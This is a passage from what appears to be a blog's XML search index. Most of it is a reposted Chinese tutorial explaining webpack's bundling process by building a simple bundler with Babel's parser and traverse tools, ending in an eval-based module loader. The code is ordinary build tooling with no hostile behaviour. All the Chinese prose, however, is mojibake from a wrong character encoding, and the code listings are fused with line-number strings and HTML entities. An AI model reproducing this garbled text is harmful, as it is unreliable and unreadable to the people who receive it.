¼åŒºåˆ†æ„å»ºå’Œè¿è¡Œé˜¶æ®µ ä»¥ä¸€ä¸ªæˆ–å¤šä¸ªæ— çŠ¶æ€è¿›ç¨‹è¿è¡Œåº”ç”¨ é€šè¿‡ç«¯å£ç»‘å®šè¾“å‡ºæœåŠ¡ é€šè¿‡è¿›ç¨‹æ¨¡å‹æ‰©å±• é€šè¿‡å¿«é€Ÿå¯åŠ¨å’Œä¼˜é›…åœ°å…³é—­ä¿è¯æœ€å¤§çš„å¥å£®æ€§ å°½å¯èƒ½ä¿æŒå¼€å‘å’Œçº¿ä¸Šç¯å¢ƒå°½é‡ä¸€è‡´ æŠŠæ—¥å¿—è§†ä¸ºäº‹ä»¶æµ ä»¥ä¸€æ¬¡æ€§è¿›ç¨‹çš„å½¢å¼è¿è¡Œåå°ç®¡ç†ä»»åŠ¡ å¦‚æœéµå®ˆäº†ä»¥ä¸Šè§„åˆ™ï¼Œä½ å°†èƒ½å¤Ÿé€šè¿‡ PM2 é«˜æ•ˆè€Œå®‰å…¨åœ°æ‰©å±•ä»»ä½•åº”ç”¨ã€‚]]></content>
      <categories>
        <category>Node.js</category>
      </categories>
      <tags>
        <tag>Node.js</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[webpackæ‰“åŒ…åŸç† ? çœ‹å®Œè¿™ç¯‡ä½ å°±æ‡‚äº† !]]></title>
    <url>%2F2020%2F01%2F10%2FWeb%E5%89%8D%E7%AB%AF%2Fwebpack%E6%89%93%E5%8C%85%E5%8E%9F%E7%90%86%20%3F%20%E7%9C%8B%E5%AE%8C%E8%BF%99%E7%AF%87%E4%BD%A0%E5%B0%B1%E6%87%82%E4%BA%86%20!%2F</url>
    <content type="text"><![CDATA[è½¬è½½è‡ªæ˜é‡‘ï¼ŒåŸæ–‡é“¾æ¥ï¼šhttps://juejin.im/post/5e116fce6fb9a047ea7472a6?utm_source=gold_browser_extension å‰è¨€[å®è·µç³»åˆ—] ä¸»è¦æ˜¯è®©æˆ‘ä»¬é€šè¿‡å®è·µå»åŠ æ·±å¯¹ä¸€äº›åŸç†çš„ç†è§£ã€‚ [å®è·µç³»åˆ—]å‰ç«¯è·¯ç”± [å®è·µç³»åˆ—]Babel åŸç† [å®è·µç³»åˆ—]å®è·µè¿™ä¸€æ¬¡,å½»åº•ææ‡‚æµè§ˆå™¨ç¼“å­˜æœºåˆ¶ [å®è·µç³»åˆ—]ä½ èƒ½æ‰‹å†™ä¸€ä¸ª Promise å—ï¼ŸYes I promiseã€‚ ä»€ä¹ˆæ˜¯ webpack ? æœ¬è´¨ä¸Š,webpack æ˜¯ä¸€ä¸ªç°ä»£ JavaScript åº”ç”¨ç¨‹åºçš„é™æ€æ¨¡å—æ‰“åŒ…å™¨(module bundler)ã€‚å½“ webpack å¤„ç†åº”ç”¨ç¨‹åºæ—¶,å®ƒä¼šé€’å½’åœ°æ„å»ºä¸€ä¸ªä¾èµ–å…³ç³»å›¾(dependency graph),å…¶ä¸­åŒ…å«åº”ç”¨ç¨‹åºéœ€è¦çš„æ¯ä¸ªæ¨¡å—,ç„¶åå°†æ‰€æœ‰è¿™äº›æ¨¡å—æ‰“åŒ…æˆä¸€ä¸ªæˆ–å¤šä¸ª bundleã€‚ webpack å°±åƒä¸€æ¡ç”Ÿäº§çº¿,è¦ç»è¿‡ä¸€ç³»åˆ—å¤„ç†æµç¨‹åæ‰èƒ½å°†æºæ–‡ä»¶è½¬æ¢æˆè¾“å‡ºç»“æœã€‚ è¿™æ¡ç”Ÿäº§çº¿ä¸Šçš„æ¯ä¸ªå¤„ç†æµç¨‹çš„èŒè´£éƒ½æ˜¯å•ä¸€çš„,å¤šä¸ªæµç¨‹ä¹‹é—´æœ‰å­˜åœ¨ä¾èµ–å…³ç³»,åªæœ‰å®Œæˆå½“å‰å¤„ç†åæ‰èƒ½äº¤ç»™ä¸‹ä¸€ä¸ªæµç¨‹å»å¤„ç†ã€‚ æ’ä»¶å°±åƒæ˜¯ä¸€ä¸ªæ’å…¥åˆ°ç”Ÿäº§çº¿ä¸­çš„ä¸€ä¸ªåŠŸèƒ½,åœ¨ç‰¹å®šçš„æ—¶æœºå¯¹ç”Ÿäº§çº¿ä¸Šçš„èµ„æºåšå¤„ç†ã€‚webpack é€šè¿‡ Tapable æ¥ç»„ç»‡è¿™æ¡å¤æ‚çš„ç”Ÿäº§çº¿ã€‚ webpack åœ¨è¿è¡Œè¿‡ç¨‹ä¸­ä¼šå¹¿æ’­äº‹ä»¶,æ’ä»¶åªéœ€è¦ç›‘å¬å®ƒæ‰€å…³å¿ƒçš„äº‹ä»¶,å°±èƒ½åŠ å…¥åˆ°è¿™æ¡ç”Ÿäº§çº¿ä¸­,å»æ”¹å˜ç”Ÿäº§çº¿çš„è¿ä½œã€‚ webpack çš„äº‹ä»¶æµæœºåˆ¶ä¿è¯äº†æ’ä»¶çš„æœ‰åºæ€§,ä½¿å¾—æ•´ä¸ªç³»ç»Ÿæ‰©å±•æ€§å¾ˆå¥½ã€‚ â€“ æ·±å…¥æµ…å‡º webpack å´æµ©éºŸ webpack æ ¸å¿ƒæ¦‚å¿µEntryå…¥å£èµ·ç‚¹(entry point)æŒ‡ç¤º webpack åº”è¯¥ä½¿ç”¨å“ªä¸ªæ¨¡å—,æ¥ä½œä¸ºæ„å»ºå…¶å†…éƒ¨ä¾èµ–å›¾çš„å¼€å§‹ã€‚ è¿›å…¥å…¥å£èµ·ç‚¹å,webpack ä¼šæ‰¾å‡ºæœ‰å“ªäº›æ¨¡å—å’Œåº“æ˜¯å…¥å£èµ·ç‚¹ï¼ˆç›´æ¥å’Œé—´æ¥ï¼‰ä¾èµ–çš„ã€‚ æ¯ä¸ªä¾èµ–é¡¹éšå³è¢«å¤„ç†,æœ€åè¾“å‡ºåˆ°ç§°ä¹‹ä¸º bundles çš„æ–‡ä»¶ä¸­ã€‚ Outputoutput å±æ€§å‘Šè¯‰ webpack åœ¨å“ªé‡Œè¾“å‡ºå®ƒæ‰€åˆ›å»ºçš„ bundles,ä»¥åŠå¦‚ä½•å‘½åè¿™äº›æ–‡ä»¶,é»˜è®¤å€¼ä¸º ./distã€‚ åŸºæœ¬ä¸Š,æ•´ä¸ªåº”ç”¨ç¨‹åºç»“æ„,éƒ½ä¼šè¢«ç¼–è¯‘åˆ°ä½ æŒ‡å®šçš„è¾“å‡ºè·¯å¾„çš„æ–‡ä»¶å¤¹ä¸­ã€‚ Moduleæ¨¡å—,åœ¨ Webpack é‡Œä¸€åˆ‡çš†æ¨¡å—,ä¸€ä¸ªæ¨¡å—å¯¹åº”ç€ä¸€ä¸ªæ–‡ä»¶ã€‚Webpack ä¼šä»é…ç½®çš„ Entry å¼€å§‹é€’å½’æ‰¾å‡ºæ‰€æœ‰ä¾èµ–çš„æ¨¡å—ã€‚ Chunkä»£ç å—,ä¸€ä¸ª Chunk ç”±å¤šä¸ªæ¨¡å—ç»„åˆè€Œæˆ,ç”¨äºä»£ç åˆå¹¶ä¸åˆ†å‰²ã€‚ Loaderloader è®© webpack èƒ½å¤Ÿå»å¤„ç†é‚£äº›é JavaScript æ–‡ä»¶ï¼ˆwebpack è‡ªèº«åªç†è§£ JavaScriptï¼‰ã€‚ loader å¯ä»¥å°†æ‰€æœ‰ç±»å‹çš„æ–‡ä»¶è½¬æ¢ä¸º webpack èƒ½å¤Ÿå¤„ç†çš„æœ‰æ•ˆæ¨¡å—,ç„¶åä½ å°±å¯ä»¥åˆ©ç”¨ webpack çš„æ‰“åŒ…èƒ½åŠ›,å¯¹å®ƒä»¬è¿›è¡Œå¤„ç†ã€‚ æœ¬è´¨ä¸Š,webpack loader å°†æ‰€æœ‰ç±»å‹çš„æ–‡ä»¶,è½¬æ¢ä¸ºåº”ç”¨ç¨‹åºçš„ä¾èµ–å›¾ï¼ˆå’Œæœ€ç»ˆçš„ bundleï¼‰å¯ä»¥ç›´æ¥å¼•ç”¨çš„æ¨¡å—ã€‚ Pluginloader è¢«ç”¨äºè½¬æ¢æŸäº›ç±»å‹çš„æ¨¡å—,è€Œæ’ä»¶åˆ™å¯ä»¥ç”¨äºæ‰§è¡ŒèŒƒå›´æ›´å¹¿çš„ä»»åŠ¡ã€‚ æ’ä»¶çš„èŒƒå›´åŒ…æ‹¬,ä»æ‰“åŒ…ä¼˜åŒ–å’Œå‹ç¼©,ä¸€ç›´åˆ°é‡æ–°å®šä¹‰ç¯å¢ƒä¸­çš„å˜é‡ã€‚æ’ä»¶æ¥å£åŠŸèƒ½æå…¶å¼ºå¤§,å¯ä»¥ç”¨æ¥å¤„ç†å„ç§å„æ ·çš„ä»»åŠ¡ã€‚ webpack æ„å»ºæµç¨‹Webpack çš„è¿è¡Œæµç¨‹æ˜¯ä¸€ä¸ªä¸²è¡Œçš„è¿‡ç¨‹,ä»å¯åŠ¨åˆ°ç»“æŸä¼šä¾æ¬¡æ‰§è¡Œä»¥ä¸‹æµç¨‹ : åˆå§‹åŒ–å‚æ•°ï¼šä»é…ç½®æ–‡ä»¶å’Œ Shell è¯­å¥ä¸­è¯»å–ä¸åˆå¹¶å‚æ•°,å¾—å‡ºæœ€ç»ˆçš„å‚æ•°ã€‚ å¼€å§‹ç¼–è¯‘ï¼šç”¨ä¸Šä¸€æ­¥å¾—åˆ°çš„å‚æ•°åˆå§‹åŒ– Compiler å¯¹è±¡,åŠ è½½æ‰€æœ‰é…ç½®çš„æ’ä»¶,æ‰§è¡Œå¯¹è±¡çš„ run æ–¹æ³•å¼€å§‹æ‰§è¡Œç¼–è¯‘ã€‚ ç¡®å®šå…¥å£ï¼šæ ¹æ®é…ç½®ä¸­çš„ entry æ‰¾å‡ºæ‰€æœ‰çš„å…¥å£æ–‡ä»¶ã€‚ ç¼–è¯‘æ¨¡å—ï¼šä»å…¥å£æ–‡ä»¶å‡ºå‘,è°ƒç”¨æ‰€æœ‰é…ç½®çš„ Loader å¯¹æ¨¡å—è¿›è¡Œç¿»è¯‘,å†æ‰¾å‡ºè¯¥æ¨¡å—ä¾èµ–çš„æ¨¡å—,å†é€’å½’æœ¬æ­¥éª¤ç›´åˆ°æ‰€æœ‰å…¥å£ä¾èµ–çš„æ–‡ä»¶éƒ½ç»è¿‡äº†æœ¬æ­¥éª¤çš„å¤„ç†ã€‚ å®Œæˆæ¨¡å—ç¼–è¯‘ï¼šåœ¨ç»è¿‡ç¬¬ 4 æ­¥ä½¿ç”¨ Loader ç¿»è¯‘å®Œæ‰€æœ‰æ¨¡å—å,å¾—åˆ°äº†æ¯ä¸ªæ¨¡å—è¢«ç¿»è¯‘åçš„æœ€ç»ˆå†…å®¹ä»¥åŠå®ƒä»¬ä¹‹é—´çš„ä¾èµ–å…³ç³»ã€‚ è¾“å‡ºèµ„æºï¼šæ ¹æ®å…¥å£å’Œæ¨¡å—ä¹‹é—´çš„ä¾èµ–å…³ç³»,ç»„è£…æˆä¸€ä¸ªä¸ªåŒ…å«å¤šä¸ªæ¨¡å—çš„ Chunk,å†æŠŠæ¯ä¸ª Chunk è½¬æ¢æˆä¸€ä¸ªå•ç‹¬çš„æ–‡ä»¶åŠ å…¥åˆ°è¾“å‡ºåˆ—è¡¨,è¿™æ­¥æ˜¯å¯ä»¥ä¿®æ”¹è¾“å‡ºå†…å®¹çš„æœ€åæœºä¼šã€‚ è¾“å‡ºå®Œæˆï¼šåœ¨ç¡®å®šå¥½è¾“å‡ºå†…å®¹å,æ ¹æ®é…ç½®ç¡®å®šè¾“å‡ºçš„è·¯å¾„å’Œæ–‡ä»¶å,æŠŠæ–‡ä»¶å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ç³»ç»Ÿã€‚ åœ¨ä»¥ä¸Šè¿‡ç¨‹ä¸­,Webpack ä¼šåœ¨ç‰¹å®šçš„æ—¶é—´ç‚¹å¹¿æ’­å‡ºç‰¹å®šçš„äº‹ä»¶,æ’ä»¶åœ¨ç›‘å¬åˆ°æ„Ÿå…´è¶£çš„äº‹ä»¶åä¼šæ‰§è¡Œç‰¹å®šçš„é€»è¾‘,å¹¶ä¸”æ’ä»¶å¯ä»¥è°ƒç”¨ Webpack æä¾›çš„ API æ”¹å˜ Webpack çš„è¿è¡Œç»“æœã€‚ å®è·µåŠ æ·±ç†è§£,æ’¸ä¸€ä¸ªç®€æ˜“ webpack1. å®šä¹‰ Compiler ç±»1234567891011121314151617class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123;&#125; // é‡å†™ requireå‡½æ•°,è¾“å‡ºbundle generate() &#123;&#125;&#125;å¤åˆ¶ä»£ç  2. è§£æå…¥å£æ–‡ä»¶,è·å– ASTæˆ‘ä»¬è¿™é‡Œä½¿ç”¨@babel/parser,è¿™æ˜¯ babel7 çš„å·¥å…·,æ¥å¸®åŠ©æˆ‘ä»¬åˆ†æå†…éƒ¨çš„è¯­æ³•,åŒ…æ‹¬ es6,è¿”å›ä¸€ä¸ª AST æŠ½è±¡è¯­æ³•æ ‘ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748// webpack.config.jsconst path = require('path')module.exports = &#123; entry: './src/index.js', output: &#123; path: path.resolve(__dirname, './dist'), filename: 'main.js' &#125;&#125;//å¤åˆ¶ä»£ç const fs = require('fs')const parser = require('@babel/parser')const options = require('./webpack.config')const Parser = &#123; getAst: path =&gt; &#123; // è¯»å–å…¥å£æ–‡ä»¶ const content = fs.readFileSync(path, 'utf-8') // å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘ return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123; const ast = Parser.getAst(this.entry) &#125; // é‡å†™ requireå‡½æ•°,è¾“å‡ºbundle generate() &#123;&#125;&#125;new Compiler(options).run()å¤åˆ¶ä»£ç  3. æ‰¾å‡ºæ‰€æœ‰ä¾èµ–æ¨¡å—Babel æä¾›äº†@babel/traverse(éå†)æ–¹æ³•ç»´æŠ¤è¿™ AST æ ‘çš„æ•´ä½“çŠ¶æ€,æˆ‘ä»¬è¿™é‡Œä½¿ç”¨å®ƒæ¥å¸®æˆ‘ä»¬æ‰¾å‡ºä¾èµ–æ¨¡å—ã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst Parser = &#123; getAst: path =&gt; &#123; // è¯»å–å…¥å£æ–‡ä»¶ const content = fs.readFileSync(path, 'utf-8') // å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘ return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // éå†æ‰€æœ‰çš„ import æ¨¡å—,å­˜å…¥dependecies traverse(ast, &#123; // ç±»å‹ä¸º ImportDeclaration çš„ AST èŠ‚ç‚¹ (å³ä¸ºimport è¯­å¥) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // ä¿å­˜ä¾èµ–æ¨¡å—è·¯å¾„,ä¹‹åç”Ÿæˆä¾èµ–å…³ç³»å›¾éœ€è¦ç”¨åˆ° const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123; const &#123; getAst, getDependecies &#125; = Parser const ast = getAst(this.entry) const dependecies = getDependecies(ast, this.entry) &#125; // é‡å†™ requireå‡½æ•°,è¾“å‡ºbundle generate() &#123;&#125;&#125;new Compiler(options).run()å¤åˆ¶ä»£ç  4. AST è½¬æ¢ä¸º codeå°† AST è¯­æ³•æ ‘è½¬æ¢ä¸ºæµè§ˆå™¨å¯æ‰§è¡Œä»£ç ,æˆ‘ä»¬è¿™é‡Œä½¿ç”¨@babel/core å’Œ @babel/preset-envã€‚ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst &#123; transformFromAst &#125; = require('@babel/core')const Parser = &#123; getAst: path =&gt; &#123; // è¯»å–å…¥å£æ–‡ä»¶ const content = fs.readFileSync(path, 'utf-8') // å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘ return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // éå†æ‰€æœ‰çš„ import æ¨¡å—,å­˜å…¥dependecies traverse(ast, &#123; // ç±»å‹ä¸º ImportDeclaration çš„ AST èŠ‚ç‚¹ (å³ä¸ºimport è¯­å¥) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // ä¿å­˜ä¾èµ–æ¨¡å—è·¯å¾„,ä¹‹åç”Ÿæˆä¾èµ–å…³ç³»å›¾éœ€è¦ç”¨åˆ° const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;, getCode: ast =&gt; &#123; // ASTè½¬æ¢ä¸ºcode const &#123; code &#125; = transformFromAst(ast, null, &#123; presets: ['@babel/preset-env'] &#125;) return code &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123; const &#123; getAst, getDependecies, getCode &#125; = Parser const ast = getAst(this.entry) const dependecies = getDependecies(ast, this.entry) const code = getCode(ast) &#125; // é‡å†™ requireå‡½æ•°,è¾“å‡ºbundle generate() &#123;&#125;&#125;new Compiler(options).run()å¤åˆ¶ä»£ç  5. é€’å½’è§£ææ‰€æœ‰ä¾èµ–é¡¹,ç”Ÿæˆä¾èµ–å…³ç³»å›¾123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst &#123; transformFromAst &#125; = require('@babel/core')const Parser = &#123; getAst: path =&gt; &#123; // è¯»å–å…¥å£æ–‡ä»¶ const content = fs.readFileSync(path, 'utf-8') // å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘ return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // éå†æ‰€æœ‰çš„ import æ¨¡å—,å­˜å…¥dependecies traverse(ast, &#123; // ç±»å‹ä¸º ImportDeclaration çš„ AST èŠ‚ç‚¹ (å³ä¸ºimport è¯­å¥) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // ä¿å­˜ä¾èµ–æ¨¡å—è·¯å¾„,ä¹‹åç”Ÿæˆä¾èµ–å…³ç³»å›¾éœ€è¦ç”¨åˆ° const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;, getCode: ast =&gt; &#123; // ASTè½¬æ¢ä¸ºcode const &#123; code &#125; = transformFromAst(ast, null, &#123; presets: ['@babel/preset-env'] &#125;) return code &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123; // è§£æå…¥å£æ–‡ä»¶ const info = this.build(this.entry) this.modules.push(info) this.modules.forEach((&#123; dependecies &#125;) =&gt; &#123; // åˆ¤æ–­æœ‰ä¾èµ–å¯¹è±¡,é€’å½’è§£ææ‰€æœ‰ä¾èµ–é¡¹ if (dependecies) &#123; for (const dependency in dependecies) &#123; this.modules.push(this.build(dependecies[dependency])) &#125; &#125; &#125;) // ç”Ÿæˆä¾èµ–å…³ç³»å›¾ const dependencyGraph = this.modules.reduce( (graph, item) =&gt; (&#123; ...graph, // ä½¿ç”¨æ–‡ä»¶è·¯å¾„ä½œä¸ºæ¯ä¸ªæ¨¡å—çš„å”¯ä¸€æ ‡è¯†ç¬¦,ä¿å­˜å¯¹åº”æ¨¡å—çš„ä¾èµ–å¯¹è±¡å’Œæ–‡ä»¶å†…å®¹ [item.filename]: &#123; dependecies: item.dependecies, code: item.code &#125; &#125;), &#123;&#125; ) &#125; build(filename) &#123; const &#123; getAst, getDependecies, getCode &#125; = Parser const ast = getAst(filename) const dependecies = getDependecies(ast, filename) const code = getCode(ast) return &#123; // æ–‡ä»¶è·¯å¾„,å¯ä»¥ä½œä¸ºæ¯ä¸ªæ¨¡å—çš„å”¯ä¸€æ ‡è¯†ç¬¦ filename, // ä¾èµ–å¯¹è±¡,ä¿å­˜ç€ä¾èµ–æ¨¡å—è·¯å¾„ dependecies, // æ–‡ä»¶å†…å®¹ code &#125; &#125; // é‡å†™ requireå‡½æ•°,è¾“å‡ºbundle generate() &#123;&#125;&#125;new Compiler(options).run()å¤åˆ¶ä»£ç  6. é‡å†™ require å‡½æ•°,è¾“å‡º bundle123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117const fs = require('fs')const path = require('path')const options = require('./webpack.config')const parser = require('@babel/parser')const traverse = require('@babel/traverse').defaultconst &#123; transformFromAst &#125; = require('@babel/core')const Parser = &#123; getAst: path =&gt; &#123; // è¯»å–å…¥å£æ–‡ä»¶ const content = fs.readFileSync(path, 'utf-8') // å°†æ–‡ä»¶å†…å®¹è½¬ä¸ºASTæŠ½è±¡è¯­æ³•æ ‘ return parser.parse(content, &#123; sourceType: 'module' &#125;) &#125;, getDependecies: (ast, filename) =&gt; &#123; const dependecies = &#123;&#125; // éå†æ‰€æœ‰çš„ import æ¨¡å—,å­˜å…¥dependecies traverse(ast, &#123; // ç±»å‹ä¸º ImportDeclaration çš„ AST èŠ‚ç‚¹ (å³ä¸ºimport è¯­å¥) ImportDeclaration(&#123; node &#125;) &#123; const dirname = path.dirname(filename) // ä¿å­˜ä¾èµ–æ¨¡å—è·¯å¾„,ä¹‹åç”Ÿæˆä¾èµ–å…³ç³»å›¾éœ€è¦ç”¨åˆ° const filepath = './' + path.join(dirname, node.source.value) dependecies[node.source.value] = filepath &#125; &#125;) return dependecies &#125;, getCode: ast =&gt; &#123; // ASTè½¬æ¢ä¸ºcode const &#123; code &#125; = transformFromAst(ast, null, &#123; presets: ['@babel/preset-env'] &#125;) return code &#125;&#125;class Compiler &#123; constructor(options) &#123; // webpack é…ç½® const &#123; entry, output &#125; = options // å…¥å£ this.entry = entry // å‡ºå£ this.output = output // æ¨¡å— this.modules = [] &#125; // æ„å»ºå¯åŠ¨ run() &#123; // è§£æå…¥å£æ–‡ä»¶ const info = this.build(this.entry) this.modules.push(info) this.modules.forEach((&#123; dependecies &#125;) =&gt; &#123; // åˆ¤æ–­æœ‰ä¾èµ–å¯¹è±¡,é€’å½’è§£ææ‰€æœ‰ä¾èµ–é¡¹ if (dependecies) &#123; for (const dependency in dependecies) &#123; this.modules.push(this.build(dependecies[dependency])) &#125; &#125; &#125;) // ç”Ÿæˆä¾èµ–å…³ç³»å›¾ const dependencyGraph = this.modules.reduce( (graph, item) =&gt; (&#123; ...graph, // ä½¿ç”¨æ–‡ä»¶è·¯å¾„ä½œä¸ºæ¯ä¸ªæ¨¡å—çš„å”¯ä¸€æ ‡è¯†ç¬¦,ä¿å­˜å¯¹åº”æ¨¡å—çš„ä¾èµ–å¯¹è±¡å’Œæ–‡ä»¶å†…å®¹ [item.filename]: &#123; dependecies: item.dependecies, code: item.code &#125; &#125;), &#123;&#125; ) this.generate(dependencyGraph) &#125; build(filename) &#123; const &#123; getAst, getDependecies, getCode &#125; = Parser const ast = getAst(filename) const dependecies = getDependecies(ast, filename) const code = getCode(ast) return &#123; // æ–‡ä»¶è·¯å¾„,å¯ä»¥ä½œä¸ºæ¯ä¸ªæ¨¡å—çš„å”¯ä¸€æ ‡è¯†ç¬¦ filename, // ä¾èµ–å¯¹è±¡,ä¿å­˜ç€ä¾èµ–æ¨¡å—è·¯å¾„ dependecies, // æ–‡ä»¶å†…å®¹ code &#125; &#125; // é‡å†™ requireå‡½æ•° (æµè§ˆå™¨ä¸èƒ½è¯†åˆ«commonjsè¯­æ³•),è¾“å‡ºbundle generate(code) &#123; // è¾“å‡ºæ–‡ä»¶è·¯å¾„ const filePath = path.join(this.output.path, this.output.filename) // æ‡µé€¼äº†å—? æ²¡äº‹,ä¸‹ä¸€èŠ‚æˆ‘ä»¬æ‹ä¸€æ‹ const bundle = `(function(graph)&#123; function require(module)&#123; function localRequire(relativePath)&#123; return require(graph[module].dependecies[relativePath]) &#125; var exports = &#123;&#125;; (function(require,exports,code)&#123; eval(code) &#125;)(localRequire,exports,graph[module].code); return exports; &#125; require('$&#123;this.entry&#125;') &#125;)($&#123;JSON.stringify(code)&#125;)` // æŠŠæ–‡ä»¶å†…å®¹å†™å…¥åˆ°æ–‡ä»¶ç³»ç»Ÿ fs.writeFileSync(filePath, bundle, 'utf-8') &#125;&#125;new Compiler(options).run()å¤åˆ¶ä»£ç  7. çœ‹å®Œè¿™èŠ‚,å½»åº•ææ‡‚ bundle å®ç°æˆ‘ä»¬é€šè¿‡ä¸‹é¢çš„ä¾‹å­æ¥è¿›è¡Œè®²è§£,å…ˆæ­»äº¡å‡è§† 30 ç§’ 123456789101112131415161718192021222324;(function(graph) &#123; function require(moduleId) &#123; function localRequire(relativePath) &#123; return require(graph[moduleId].dependecies[relativePath]) &#125; var exports = &#123;&#125; ;(function(require, exports, code) &#123; eval(code) &#125;)(localRequire, exports, graph[moduleId].code) return exports &#125; require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)å¤åˆ¶ä»£ç  step 1 : ä»å…¥å£æ–‡ä»¶å¼€å§‹æ‰§è¡Œ1234567891011121314151617181920// å®šä¹‰ä¸€ä¸ªç«‹å³æ‰§è¡Œå‡½æ•°,ä¼ å…¥ç”Ÿæˆçš„ä¾èµ–å…³ç³»å›¾;(function(graph) &#123; // é‡å†™requireå‡½æ•° function require(moduleId) &#123; console.log(moduleId) // ./src/index.js &#125; // ä»å…¥å£æ–‡ä»¶å¼€å§‹æ‰§è¡Œ require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)å¤åˆ¶ä»£ç  step 2 : ä½¿ç”¨ eval æ‰§è¡Œä»£ç 1234567891011121314151617181920212223// å®šä¹‰ä¸€ä¸ªç«‹å³æ‰§è¡Œå‡½æ•°,ä¼ å…¥ç”Ÿæˆçš„ä¾èµ–å…³ç³»å›¾;(function(graph) &#123; // é‡å†™requireå‡½æ•° function require(moduleId) &#123; ;(function(code) &#123; console.log(code) // "use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack")); eval(code) // Uncaught TypeError: Cannot read property 'code' of undefined &#125;)(graph[moduleId].code) &#125; // ä»å…¥å£æ–‡ä»¶å¼€å§‹æ‰§è¡Œ require('./src/index.js')&#125;)(&#123; './src/index.js': &#123; dependecies: &#123; './hello.js': './src/hello.js' &#125;, code: '"use strict";\n\nvar _hello = require("./hello.js");\n\ndocument.write((0, _hello.say)("webpack"));' &#125;, './src/hello.js': &#123; dependecies: &#123;&#125;, code: '"use strict";\n\nObject.defineProperty(exports, "__esModule", &#123;\n value: true\n&#125;);\nexports.say = say;\n\nfunction say(name) &#123;\n return "hello ".concat(name);\n&#125;' &#125;&#125;)å¤åˆ¶ä»£ç  å¯ä»¥çœ‹åˆ°,æˆ‘ä»¬åœ¨æ‰§è¡Œâ€./src/index.jsâ€æ–‡ä»¶ä»£ç çš„æ—¶å€™æŠ¥é”™äº†,è¿™æ˜¯å› ä¸º index.js é‡Œå¼•ç”¨ä¾èµ– hello.js,è€Œæˆ‘ä»¬æ²¡æœ‰å¯¹ä¾èµ–è¿›è¡Œå¤„ç†,æ¥ä¸‹æ¥æˆ‘ä»¬å¯¹ä¾èµ–å¼•ç”¨è¿›è¡Œå¤„ç†ã€‚ step 3 : ä¾èµ–å¯¹è±¡å¯»å€æ˜ å°„,è·å– exports 